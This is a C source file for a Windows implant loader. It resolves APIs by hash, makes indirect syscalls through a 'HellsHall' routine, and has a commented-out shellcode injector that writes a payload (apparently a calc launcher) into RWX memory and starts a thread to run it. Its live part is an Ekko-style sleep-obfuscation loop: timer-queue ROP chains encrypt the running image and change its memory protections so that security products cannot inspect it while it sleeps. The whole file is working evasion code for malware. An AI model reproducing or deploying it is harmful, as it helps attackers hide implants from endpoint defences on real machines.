#include <Core.h>
#include <Win32.h>
#include <Structs.h>
#include <HellsHall.h>


#ifdef ISDLL
  #define EXPORT __declspec(dllexport)
  EXPORT BOOL WINAPI DllMain( HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved )
  {
    switch( fdwReason ) 
    { 
        case DLL_PROCESS_ATTACH:
         // Initialize once for each new process.
         // Return FALSE to fail DLL load.
         {
            Entry();
            break;
         }

        case DLL_THREAD_ATTACH:
         // Do thread-specific initialization.
            break;

        case DLL_THREAD_DETACH:
         // Do thread-specific cleanup.
            break;

        case DLL_PROCESS_DETACH:
        
        if (lpvReserved != NULL)
        {
            break; // do not do cleanup if process termination scenario
        }
            
         // Perform any necessary cleanup.
            break;
    }
    return TRUE;  // Successful DLL_PROCESS_ATTACH.
  }
#endif


#define NtAllocateVirtualMemory_CRC32b   0xe0762feb
#define NtWriteVirtualMemory_CRC32b  0xe4879939
#define NtCreateThreadEx_CRC32b  0x2073465a

SEC( text, B ) VOID Entry( VOID ) 
{
    /*
    unsigned char rawData[] = {
        0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
        0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
        0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
        0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
        0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
        0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
        0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
        0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
        0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
        0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
        0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
        0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
        0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
        0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
        0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
        0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
        0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
        0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
        0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
        0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
        0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
        0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
        0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00
    };
    
    INSTANCE Instance = { };

    Instance.Modules.Kernel32   = LdrModulePeb( HASH_KERNEL32 ); 
    Instance.Modules.Ntdll      = LdrModulePeb( HASH_NTDLL ); 
    
    if ( Instance.Modules.Kernel32 != NULL )
    {
        // Load needed functions
        Instance.Win32.LoadLibraryA = LdrFunction( Instance.Modules.Kernel32, 0xb7072fdb );
        Instance.Win32.RtlSecureZeroMemory = LdrFunction (Instance.Modules.Ntdll, 0x7906a570);
        Instance.Modules.Msvcrt      = Instance.Win32.LoadLibraryA( GET_SYMBOL("msvcrt.dll") );
        Instance.Win32.printf = LdrFunction (Instance.Modules.Msvcrt, 0xc870eef8);
        
    }

    // ------ Code ------
    MyStruct S = { 0 };
    NTDLL       NtdllSt     = { 0 };
    SysFunc     sF          = { 0 };
    
	if (!InitilizeSysFunc(NtAllocateVirtualMemory_CRC32b, &NtdllSt, &sF))
    {
        Instance.Win32.printf("Error loading NtAllocateVirtualMemory");
		return -1;
    }
	getSysFuncStruct(&S.NtAllocateVirtualMemory, &sF);

	if (!InitilizeSysFunc(NtWriteVirtualMemory_CRC32b, &NtdllSt, &sF))
    {
        Instance.Win32.printf("Error loading  NtWriteVirtualMemory\n");
		return -1;
    }
	getSysFuncStruct(&S.NtWriteVirtualMemory, &sF);

	if (!InitilizeSysFunc(NtCreateThreadEx_CRC32b, &NtdllSt, &sF))
    {
        Instance.Win32.printf("Error loading  NtCreateThreadEx\n");
		return -1;
    }
	getSysFuncStruct(&S.NtCreateThreadEx, &sF);
    
    PVOID		pAddress	= NULL;
	SIZE_T		dwSize		= sizeof(rawData);
	DWORD		dwOld		= NULL;
    PULONG		NumberOfBytesWritten = NULL;
	HANDLE		hThread		= NULL;
	NTSTATUS	STATUS		= NULL;

    SetConfig(S.NtAllocateVirtualMemory.wSSN, S.NtAllocateVirtualMemory.pInst);
    if ((STATUS = HellHall((HANDLE)-1, &pAddress, 0, &dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)) != 0x0) {
        Instance.Win32.printf("Yikes, status was %#x\n", STATUS);
        return -1;
    }
    Instance.Win32.printf("Memory was allocated to 0x%llx\n", pAddress);

    SetConfig(S.NtWriteVirtualMemory.wSSN, S.NtWriteVirtualMemory.pInst);
    if ((STATUS = HellHall((HANDLE)-1, pAddress, &rawData, sizeof(rawData), NumberOfBytesWritten)) != 0x0) {
        Instance.Win32.printf("Yikes, status was %#x\n", STATUS);
        return -1;
    }
    Instance.Win32.printf("Memory was written\n");

    SetConfig(S.NtCreateThreadEx.wSSN, S.NtCreateThreadEx.pInst);
    	if ((STATUS = HellHall(&hThread, 0x1FFFFF, NULL, (HANDLE)-1, pAddress, NULL, FALSE, NULL, NULL, NULL, NULL)) != 0x0) {
		Instance.Win32.printf("[!] NtCreateThreadEx Failed With Status : 0x%0.8X\n", STATUS);
		return -1;
	}
    Instance.Win32.printf("Thread created??\n");
    */

   
    do
        // Start Sleep Obfuscation
        Ekko( 1 * 1000 );
    while ( TRUE );
    
    
} 

SEC( text, C ) VOID Ekko ( DWORD SleepTime)
{

    #define NT_SUCCESS(Status) ( (NTSTATUS)(Status) >= 0 )
    #define NtCurrentThread() (  ( HANDLE ) ( LONG_PTR ) -2 )
    #define NtCurrentProcess() ( ( HANDLE ) ( LONG_PTR ) -1 )
    
    INSTANCE Instance = { 0 };
    
    Instance.Modules.Kernel32   = LdrModulePeb( HASH_KERNEL32 ); 
    Instance.Modules.Ntdll      = LdrModulePeb( HASH_NTDLL ); 
    Instance.Win32.LoadLibraryA = LdrFunction (Instance.Modules.Kernel32, 0xb7072fdb);
    
    Instance.Modules.Msvcrt     = Instance.Win32.LoadLibraryA( "msvcrt.dll" );
    Instance.Modules.Cryptsp     = Instance.Win32.LoadLibraryA( "cryptsp.dll" );

    Instance.Win32.CreateEventW = LdrFunction (Instance.Modules.Kernel32, 0x76b3a892);
    Instance.Win32.CreateTimerQueue = LdrFunction (Instance.Modules.Kernel32, 0x7d41d25f);
    Instance.Win32.printf = LdrFunction (Instance.Modules.Msvcrt, 0xc870eef8);
    Instance.Win32.memcpy = LdrFunction (Instance.Modules.Msvcrt, 0xc08838d0);
    Instance.Win32.NtContinue = LdrFunction (Instance.Modules.Ntdll, 0xfc3a6c2c);
    Instance.Win32.SystemFunction032 = LdrFunction (Instance.Modules.Cryptsp, 0xe58c8805);

    Instance.Win32.GetModuleHandleA = LdrFunction (Instance.Modules.Kernel32, 0xd908e1d8);
    Instance.Win32.RtlCaptureContext = LdrFunction (Instance.Modules.Kernel32, 0xeba8d910);
    Instance.Win32.VirtualProtect = LdrFunction (Instance.Modules.Kernel32, 0xe857500d);
    Instance.Win32.WaitForSingleObject = LdrFunction (Instance.Modules.Kernel32, 0xdf1b3da);
    Instance.Win32.CreateTimerQueueTimer = LdrFunction (Instance.Modules.Kernel32, 0xace88880);
    Instance.Win32.SetEvent = LdrFunction (Instance.Modules.Kernel32, 0x9d7ff713);
    Instance.Win32.DeleteTimerQueue = LdrFunction (Instance.Modules.Kernel32, 0x1b141ede);

    CONTEXT CtxThread   = { 0 };
    CONTEXT RopProtRW   = { 0 };
    CONTEXT RopMemEnc   = { 0 };
    CONTEXT RopDelay    = { 0 };
    CONTEXT RopMemDec   = { 0 };
    CONTEXT RopProtRX   = { 0 };
    CONTEXT RopSetEvt   = { 0 };

    HANDLE  hTimerQueue = NULL;
    HANDLE  hNewTimer   = NULL;
    HANDLE  hEvent      = NULL;
    PVOID   ImageBase   = NULL;
    DWORD   ImageSize   = 0;
    DWORD   OldProtect  = 0;

    // Can be randomly generated
    CHAR    KeyBuf[ 16 ]= { 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55 };

    USTRING Key = { 0 };
    USTRING Img  = { 0 };

    PVOID   NtContinue  = NULL;
    PVOID   SysFunc032  = NULL;
     
    hEvent      = Instance.Win32.CreateEventW( 0, 0, 0, 0 );
    hTimerQueue = Instance.Win32.CreateTimerQueue();

#if defined  ISEXE || defined  ISDLL
    ImageBase   = KaynCaller();
    ImageSize   = ( ( PIMAGE_NT_HEADERS ) ( ImageBase + ( ( PIMAGE_DOS_HEADER ) ImageBase )->e_lfanew ) )->OptionalHeader.SizeOfImage;
#endif

#if defined ISPIC

    ImageBase   = (PBYTE)(Entry - 0x20); // I would use start, but it returns 0 for some reason. So 0x20 below Entry it is.
    ImageSize   =  (PVOID)( GetRIPEnd  + 0x6 + 0x5) - ImageBase; //GetRIPEnd is 0x6 bytes long, and random 0x5 is at the end of the code for some reason
#endif

    Instance.Win32.printf( "[INFO] ImageBase is 0x%llx\n", ImageBase );
    Instance.Win32.printf( "[INFO] ImageSize is 0x%llx\n", ImageSize );

    Key.Buffer  = KeyBuf;
    Key.Length  = Key.MaximumLength = 16;

    Img.Buffer  = ImageBase;
    Img.Length  = Img.MaximumLength = ImageSize;
    
    
    if (  Instance.Win32.CreateTimerQueueTimer( &hNewTimer, hTimerQueue, Instance.Win32.RtlCaptureContext, &CtxThread, 0, 0, WT_EXECUTEINTIMERTHREAD ) )
    {
        
        Instance.Win32.WaitForSingleObject( hEvent, 0x100 );

        Instance.Win32.memcpy( &RopProtRW, &CtxThread, sizeof( CONTEXT ) );
        Instance.Win32.memcpy( &RopMemEnc, &CtxThread, sizeof( CONTEXT ) );
        Instance.Win32.memcpy( &RopDelay,  &CtxThread, sizeof( CONTEXT ) );
        Instance.Win32.memcpy( &RopMemDec, &CtxThread, sizeof( CONTEXT ) );
        Instance.Win32.memcpy( &RopProtRX, &CtxThread, sizeof( CONTEXT ) );
        Instance.Win32.memcpy( &RopSetEvt, &CtxThread, sizeof( CONTEXT ) );
        
        // VirtualProtect( ImageBase, ImageSize, PAGE_READWRITE, &OldProtect );
        RopProtRW.Rsp  -= 8;
        RopProtRW.Rip   = Instance.Win32.VirtualProtect;
        RopProtRW.Rcx   = ImageBase;
        RopProtRW.Rdx   = ImageSize;
        RopProtRW.R8    = PAGE_READWRITE;
        RopProtRW.R9    = &OldProtect;

        // SystemFunction032( &Key, &Img );
        RopMemEnc.Rsp  -= 8;
        RopMemEnc.Rip   = Instance.Win32.SystemFunction032;
        RopMemEnc.Rcx   = &Img;
        RopMemEnc.Rdx   = &Key;

        // WaitForSingleObject( hTargetHdl, SleepTime );
        RopDelay.Rsp   -= 8;
        RopDelay.Rip    = Instance.Win32.WaitForSingleObject;
        RopDelay.Rcx    = NtCurrentProcess();
        RopDelay.Rdx    = SleepTime;

        // SystemFunction032( &Key, &Img );
        RopMemDec.Rsp  -= 8;
        RopMemDec.Rip   = Instance.Win32.SystemFunction032;
        RopMemDec.Rcx   = &Img;
        RopMemDec.Rdx   = &Key;

        // VirtualProtect( ImageBase, ImageSize, PAGE_EXECUTE_READWRITE, &OldProtect );
        RopProtRX.Rsp  -= 8;
        RopProtRX.Rip   = Instance.Win32.VirtualProtect;
        RopProtRX.Rcx   = ImageBase;
        RopProtRX.Rdx   = ImageSize;
        RopProtRX.R8    = PAGE_EXECUTE_READWRITE;
        RopProtRX.R9    = &OldProtect;

        // SetEvent( hEvent );
        RopSetEvt.Rsp  -= 8;
        RopSetEvt.Rip   = Instance.Win32.SetEvent;
        RopSetEvt.Rcx   = hEvent;

        
        Instance.Win32.printf( "[INFO] Queue timers\n" );
        
        Instance.Win32.CreateTimerQueueTimer( &hNewTimer, hTimerQueue, Instance.Win32.NtContinue, &RopProtRW, 100, 0, WT_EXECUTEINTIMERTHREAD );
        Instance.Win32.CreateTimerQueueTimer( &hNewTimer, hTimerQueue, Instance.Win32.NtContinue, &RopMemEnc, 200, 0, WT_EXECUTEINTIMERTHREAD );
        Instance.Win32.CreateTimerQueueTimer( &hNewTimer, hTimerQueue, Instance.Win32.NtContinue, &RopDelay,  300, 0, WT_EXECUTEINTIMERTHREAD );
        Instance.Win32.CreateTimerQueueTimer( &hNewTimer, hTimerQueue, Instance.Win32.NtContinue, &RopMemDec, 400, 0, WT_EXECUTEINTIMERTHREAD );
        Instance.Win32.CreateTimerQueueTimer( &hNewTimer, hTimerQueue, Instance.Win32.NtContinue, &RopProtRX, 500, 0, WT_EXECUTEINTIMERTHREAD );
        Instance.Win32.CreateTimerQueueTimer( &hNewTimer, hTimerQueue, Instance.Win32.NtContinue, &RopSetEvt, 600, 0, WT_EXECUTEINTIMERTHREAD );

        Instance.Win32.printf( "[INFO] Wait for hEvent\n" );

        Instance.Win32.WaitForSingleObject( hEvent, INFINITE );

        Instance.Win32.printf( "[INFO] Finished waiting for event\n" );
        
    }

    Instance.Win32.DeleteTimerQueue( hTimerQueue );
    
}
